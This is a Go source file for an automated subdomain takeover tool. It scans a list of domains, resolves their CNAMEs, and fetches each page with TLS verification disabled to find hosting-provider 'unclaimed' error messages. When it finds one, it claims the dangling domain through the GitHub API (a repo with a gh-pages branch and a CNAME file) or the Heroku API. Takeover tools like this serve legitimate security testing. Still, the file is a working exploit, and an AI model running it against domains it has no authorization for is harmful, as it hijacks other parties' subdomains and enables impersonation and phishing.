package main

import (
	"bufio"
	"crypto/tls"
	"encoding/csv"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"regexp"
	"time"

	"github.com/anshumanbh/go-github/github"
	"github.com/bgentry/heroku-go"
	"github.com/subosito/gotenv"
	"golang.org/x/oauth2"
)

func main() {

	gotenv.Load()

	domainsFilePath := os.Args[1]
	domainsFile, err := os.Open(domainsFilePath)
	if err != nil {
		log.Fatalln(err)
	}
	defer domainsFile.Close()
	domainsScanner := bufio.NewScanner(domainsFile)

	recordsFilePath := os.Args[2]
	recordsFile, err := os.Open(recordsFilePath)
	if err != nil {
		log.Fatalln(err)
	}
	defer recordsFile.Close()
	recordsReader := bufio.NewReader(recordsFile)
	records := csv.NewReader(recordsReader)

	for domainsScanner.Scan() {
		domain := domainsScanner.Text()

		fmt.Println(IsReachable(domain, records))
	}

}

func IsReachable(domain string, records *csv.Reader) string {
	ch := make(chan string, 1)
	go func() {
		select {
		case ch <- check(domain, records):
		case <-time.After(5 * time.Second):
			ch <- "timedout"
		}
	}()
	return <-ch
}

func check(domain string, records *csv.Reader) string {
	cname, _ := net.LookupCNAME(domain)
	for {
		record, err := records.Read()
		if err == io.EOF {
			break
		}
		provider_name := record[0]  // The name of the provider
		provider_cname := record[1] // The CNAME used by the provider
		provider_error := record[2] // The error message that's returned for an unclaimed domain
		provider_http := record[3]  // Access through http not https (true or false)

		usesprovider, _ := regexp.MatchString(provider_cname, cname)
		if usesprovider {
			tr := &http.Transport{
				Dial: (&net.Dialer{
					Timeout: 5 * time.Second,
				}).Dial,
				TLSHandshakeTimeout: 5 * time.Second,
				TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			}

			timeout := time.Duration(5 * time.Second)
			client := &http.Client{
				Transport: tr,
				Timeout:   timeout,
			}

			protocol := "https://"
			if provider_http == "true" {
				protocol = "http://"
			}

			response, err := client.Get(protocol + domain)
			if err != nil {
				fmt.Println("")
				return "Can't reach the domain " + domain
			}

			text, err := ioutil.ReadAll(response.Body)
			if err != nil {
				log.Fatal(err)
				return "Trouble reading response"
			}

			cantakeover, _ := regexp.MatchString(provider_error, string(text))
			if cantakeover {
				return takeover(domain, provider_name)
			}
		}
	}
	return domain + " Not found as dangling for any of the common content hosting websites"
}

func takeover(domain string, provider string) string {
	switch provider {
	case "github":
		return githubcreate(domain)
	case "heroku":
		return herokucreate(domain)
	}
	fmt.Printf("Found: Misconfigured %s website at %s\n", provider, domain)
	return "This can potentially be taken over. Unfortunately, the tool does not support taking over " + provider + " websites at the moment."
}

func githubcreate(domain string) string {

	fmt.Println("Found: Misconfigured Github Page at " + domain)
	fmt.Println("Trying to take over this domain now..Please wait for a few seconds")

	// Connecting to your Github account using the Personal Access Token
	ts := oauth2.StaticTokenSource(&oauth2.Token{AccessToken: os.Getenv("token")})
	tc := oauth2.NewClient(oauth2.NoContext, ts)
	client := github.NewClient(tc)

	repo := &github.Repository{
		Name:            github.String(domain),
		Description:     github.String("testing subdomain takeovers"),
		Private:         github.Bool(false),
		LicenseTemplate: github.String("mit"),
	}

	// Creating a repo
	repocreate, _, err := client.Repositories.Create("", repo)
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
	}

	reponame := *repocreate.Name
	ownername := *repocreate.Owner.Login
	refURL := *repocreate.URL
	ref := "refs/heads/master"

	// Retrieving the SHA value of the head branch
	SHAvalue, _, err := client.Repositories.GetCommitSHA1(ownername, reponame, ref, "")
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
	}

	opt := &github.Reference{
		Ref: github.String("refs/heads/gh-pages"),
		URL: github.String(refURL + "/git/refs/heads/gh-pages"),
		Object: &github.GitObject{
			SHA: github.String(SHAvalue),
		},
	}

	// Creating the gh-pages branch using the SHA value obtained above
	newref, _, err := client.Git.CreateRef(ownername, reponame, opt)
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
	}

	Indexpath := "index.html"
	CNAMEpath := "CNAME"
	data := "This domain is temporarily suspended"

	indexfile := &github.RepositoryContentFileOptions{
		Message: github.String("Adding the index.html page"),
		Content: []byte(data),
		Branch:  github.String("gh-pages"),
	}

	// Creating the index file with the text you want to see when the domain is taken over
	newfile1, _, err := client.Repositories.CreateFile(ownername, reponame, Indexpath, indexfile)
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
	}

	cnamefile := &github.RepositoryContentFileOptions{
		Message: github.String("Adding the subdomain to takeover to the CNAME file"),
		Content: []byte(domain),
		Branch:  github.String("gh-pages"),
	}

	// Creating the CNAME file with the domain that needs to be taken over
	newfile2, _, err := client.Repositories.CreateFile(ownername, reponame, CNAMEpath, cnamefile)
	if _, ok := err.(*github.RateLimitError); ok {
		log.Println("hit rate limit")
	}

	fmt.Println("Branch created at " + *newref.URL)
	fmt.Println("Index File created at " + *newfile1.URL)
	fmt.Println("CNAME file created at " + *newfile2.URL)

	return "Please check " + domain + " after a few minutes to ensure that it has been taken over.."

}

func herokucreate(domain string) string {
	fmt.Println("Found: Misconfigured Heroku app at " + domain)
	fmt.Println("Trying to take over this domain now..Please wait for a few seconds")

	// Connecting to your Heroku account using the usernamd and the API key provided in the .env file
	client := heroku.Client{Username: os.Getenv("herokuusername"), Password: os.Getenv("herokuapikey")}

	// Adding the dangling domain as a custom domain for your appname that is retrieved from the .env file
	// This results in the dangling domain pointing to your Heroku appname
	client.DomainCreate(os.Getenv("herokuappname"), domain)

	return "Please check " + domain + " after a few minutes to ensure that it has been taken over.."
}